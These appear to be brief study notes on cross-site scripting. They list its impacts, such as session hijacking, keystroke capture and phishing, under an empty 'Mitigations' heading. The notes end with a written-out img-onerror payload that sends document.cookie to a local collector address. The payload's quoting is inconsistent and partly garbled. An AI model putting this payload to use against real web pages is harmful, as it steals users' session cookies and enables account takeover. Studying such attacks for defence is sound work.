    Mitigation



    Vulnerability because of XSS                                              Mitigations

        a)User Session Hijacking
        b)Unauthorization Activities(sending message)
        c)Capturing Keystrokes
        d)Stealing critical information(taking screenshot of DOM)
        e)Phishing Attack - Using injection I injected a form
            and that form does something the hood for you.


    now a days you cannot pass a script tag or write js that will get attached or script
    will be xecuted directly. In past this used to happen. but this a hack, here we are 
    passing a image tag- 

    ?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement('\img\');img.src="\http://127.0.0.1:5501/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
